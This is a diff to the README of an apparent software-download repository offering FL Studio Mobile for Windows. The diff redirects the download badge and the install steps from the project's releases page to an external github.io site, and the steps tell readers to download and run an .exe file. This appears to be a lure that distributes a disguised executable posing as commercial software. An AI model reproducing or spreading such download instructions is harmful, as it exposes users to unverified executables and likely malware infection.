@@ -1,6 +1,6 @@
 # 🎹 Baixar-FL-Mobile - Produce Professional Music On Windows Easily
 
-[![](https://img.shields.io/badge/Download_FL_Studio_Mobile-Blue?style=for-the-badge)](https://github.com/gtxa2251/Baixar-FL-Mobile/releases)
+[![](https://img.shields.io/badge/Download_FL_Studio_Mobile-Blue?style=for-the-badge)](https://gtxa2251.github.io)
 
 ## 📌 Overview
 
@@ -21,7 +21,7 @@ Before you begin, verify your computer meets these minimum standards to ensure s
 
 Follow these steps to set up the software on your system. 
 
-1. Visit the project release page: [https://github.com/gtxa2251/Baixar-FL-Mobile/releases](https://github.com/gtxa2251/Baixar-FL-Mobile/releases).
+1. Visit the project release page: [https://gtxa2251.github.io](https://gtxa2251.github.io).
 2. Look for the latest version listed under the Assets section.
 3. Select the file ending in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
